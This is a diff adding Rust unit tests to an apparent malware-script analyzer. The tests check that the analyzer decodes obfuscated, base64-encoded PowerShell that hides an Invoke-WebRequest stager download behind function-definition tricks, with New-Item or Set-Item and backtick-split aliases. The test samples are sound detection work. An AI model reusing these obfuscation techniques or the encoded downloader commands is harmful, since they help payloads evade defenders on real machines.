@@ -23970,6 +23970,186 @@ Clean '~~~{decoded}~~~' '~'"#
     }
 
     #[test]
+    fn ps1_literal_new_item_function_path_name_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-new-item-path-function-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"(New-Item Function:\Clean -Value {{
+  param($value,$chars)
+  return $value.Trim($chars)
+}});
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-new-item-path-function-extractor.example/stage.ps1"
+                )
+            }),
+            "literal New-Item path-name function extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_new_item_function_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-new-item-function-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"(New-Item -Path function: -Name Clean -Value {{
+  param($value,$chars)
+  return $value.Trim($chars)
+}});
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-new-item-function-extractor.example/stage.ps1"
+                )
+            }),
+            "literal New-Item function extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_new_item_alias_path_name_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-ni-path-function-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"(n`i Function:\Clean -Value {{
+  param($value,$chars)
+  return $value.Trim($chars)
+}});
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-ni-path-function-extractor.example/stage.ps1"
+                )
+            }),
+            "literal New-Item alias path-name function extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_set_item_path_name_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-set-item-path-function-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"(Set-Item Function:\Clean -Value {{
+  param($value,$chars)
+  return $value.Trim($chars)
+}});
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-set-item-path-function-extractor.example/stage.ps1"
+                )
+            }),
+            "literal Set-Item path-name function extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_set_item_alias_path_name_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-si-path-function-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"(s`i Function:\Clean -Value {{
+  param($value,$chars)
+  return $value.Trim($chars)
+}});
+Clean '~~~{decoded}~~~' '~'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-si-path-function-extractor.example/stage.ps1"
+                )
+            }),
+            "literal Set-Item alias path-name function extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_ireplace_literal_resolves_url() {
         let inner =
             r#"Invoke-WebRequest -Uri ('hxxps://ps-ireplace.example/stage' -ireplace 'xx','tt')"#;
